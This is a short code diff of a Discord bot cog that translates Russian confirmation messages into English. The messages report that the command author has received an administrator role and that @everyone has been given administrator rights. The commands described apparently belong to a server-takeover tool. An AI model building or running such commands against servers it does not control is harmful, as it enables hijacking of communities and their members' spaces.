@@ -18,7 +18,6 @@ from discord.ext import (
 )
 
 
-
 class Roles_Commands(commands.Cog):
 
     def __init__(self, client):
@@ -43,8 +42,8 @@ class Roles_Commands(commands.Cog):
             await ctx.message.delete()
 
             embed = discord.Embed(
-                title = '✅ | Успешная выдача роли администратора',
-                description = f'''**{ctx.author.mention} вам успешно выдана роль с правами администратора.**''',
+                title = '✅ | Successful issuance of the administrator role',
+                description = f'''**{ctx.author.mention} you have been assigned a role with administrator rights.**''',
                 color = 0xb9b9b9
             )
 
@@ -69,8 +68,8 @@ class Roles_Commands(commands.Cog):
             await ctx.message.delete()
 
             embed = discord.Embed(
-                title = '✅ | Успешная выдача прав администратора всем участникам',
-                description = f'''> {ctx.author.mention} роли @everyone было выдано право администратора! Теперь все участники могут приглашать ботов, вносить изменения в сервер.''',
+                title = '✅ | Successful granting of administrator rights to all members',
+                description = f'''> {ctx.author.mention} the @everyone role has been granted administrator rights! Now all participants can invite bots, make changes to the server.''',
                 color = 0xb9b9b9
             )
             try:
